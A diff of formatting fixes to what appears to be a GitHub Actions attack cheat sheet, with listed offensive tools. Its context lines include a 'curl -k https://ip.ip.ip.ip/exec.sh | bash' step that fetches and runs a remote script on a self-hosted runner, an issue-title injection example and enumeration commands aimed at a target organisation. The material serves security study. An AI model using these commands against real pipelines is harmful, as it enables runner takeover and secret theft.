@@ -24,13 +24,13 @@ jobs:
     - run: echo whoami"
 ```
 
-
 ## Misconfigured Actions
 
 Analyze repositories to find misconfigured Github actions.
 
 * [synacktiv/octoscan](https://github.com/synacktiv/octoscan) - Octoscan is a static vulnerability scanner for GitHub action workflows.
 * [boostsecurityio/poutine](https://github.com/boostsecurityio/poutine) - Poutine is a security scanner that detects misconfigurations and vulnerabilities in the build pipelines of a repository. It supports parsing CI workflows from GitHub Actions and Gitlab CI/CD.
+
     ```ps1
     # Using Docker
     $ docker run ghcr.io/boostsecurityio/poutine:latest
@@ -48,8 +48,7 @@ Analyze repositories to find misconfigured Github actions.
     $ poutine -token "$GL_TOKEN" -scm gitlab -scm-base-uri https://example.com org/repo
     ```
 
-![](https://raw.githubusercontent.com/jstawinski/GitHub-Actions-Attack-Diagram/refs/heads/main/GitHub%20Actions%20Attack%20Diagram.svg)
-
+![GitHub-Actions-Attack-Diagram](https://raw.githubusercontent.com/jstawinski/GitHub-Actions-Attack-Diagram/refs/heads/main/GitHub%20Actions%20Attack%20Diagram.svg)
 
 ### Repo Jacking
 
@@ -60,7 +59,6 @@ When the action is using a non-existing action, Github username or organization.
 ```
 
 > :warning: To protect against repojacking, GitHub employs a security mechanism that disallows the registration of previous repository names with 100 clones in the week before renaming or deleting the owner's account. [The GitHub Actions Worm: Compromising GitHub Repositories Through the Actions Dependency Tree - Asi Greenholts](https://www.paloaltonetworks.com/blog/prisma-cloud/github-actions-worm-dependencies/)
-
 
 ### Untrusted Input Evaluation
 
@@ -75,12 +73,11 @@ jobs:
     - run: echo "${{github.event.issue.title}}"
 ```
 
-
 ### Extract Sensitive Variables and Secrets
 
 **Variables** are used for non-sensitive configuration data. They are accessible only by GitHub Actions in the context of this environment by using the variable context.
 
-**Secrets** are encrypted environment variables. They are accessible only by GitHub Actions in the context of this environment by using the secret context. 
+**Secrets** are encrypted environment variables. They are accessible only by GitHub Actions in the context of this environment by using the secret context.
 
 ```yml
 jobs:
@@ -97,15 +94,15 @@ jobs:
 
 * [synacktiv/gh-hijack-runner](https://github.com/synacktiv/gh-hijack-runner) - A python script to create a fake GitHub runner and hijack pipeline jobs to leak CI/CD secrets.
 
-
 ## Self-Hosted Runners
 
-A self-hosted runner for GitHub Actions is a machine that you manage and maintain to run workflows from your GitHub repository. Unlike GitHub's own hosted runners, which operate on GitHub's infrastructure, self-hosted runners run on your own infrastructure. This allows for more control over the hardware, operating system, software, and security of the runner environment. 
+A self-hosted runner for GitHub Actions is a machine that you manage and maintain to run workflows from your GitHub repository. Unlike GitHub's own hosted runners, which operate on GitHub's infrastructure, self-hosted runners run on your own infrastructure. This allows for more control over the hardware, operating system, software, and security of the runner environment.
 
 Scan a public GitHub Organization for Self-Hosted Runners
 
 * [AdnaneKhan/Gato-X](https://github.com/AdnaneKhan/Gato-X) - Fork of Gato - Gato (Github Attack TOolkit) - Extreme Edition
 * [praetorian-inc/gato](https://github.com/praetorian-inc/gato) - GitHub Actions Pipeline Enumeration and Attack Tool
+
     ```ps1
     gato -s enumerate -t targetOrg -oJ target_org_gato.json
     ```
@@ -146,9 +143,8 @@ jobs:
           curl -k https://ip.ip.ip.ip/exec.sh | bash
 ```
 
-
 ## References
 
 * [GITHUB ACTIONS EXPLOITATION: SELF HOSTED RUNNERS - Hugo Vincent - 17/07/2024](https://www.synacktiv.com/publications/github-actions-exploitation-self-hosted-runners)
-* [GITHUB ACTIONS EXPLOITATION: REPO JACKING AND ENVIRONMENT MANIPULATION - Hugo Vincent - 10/07/2024 ](https://www.synacktiv.com/publications/github-actions-exploitation-repo-jacking-and-environment-manipulation)
-* [GITHUB ACTIONS EXPLOITATION: DEPENDABOT - Hugo Vincent - 06/08/2024 ](https://www.synacktiv.com/publications/github-actions-exploitation-dependabot)
+* [GITHUB ACTIONS EXPLOITATION: REPO JACKING AND ENVIRONMENT MANIPULATION - Hugo Vincent - 10/07/2024](https://www.synacktiv.com/publications/github-actions-exploitation-repo-jacking-and-environment-manipulation)
+* [GITHUB ACTIONS EXPLOITATION: DEPENDABOT - Hugo Vincent - 06/08/2024](https://www.synacktiv.com/publications/github-actions-exploitation-dependabot)
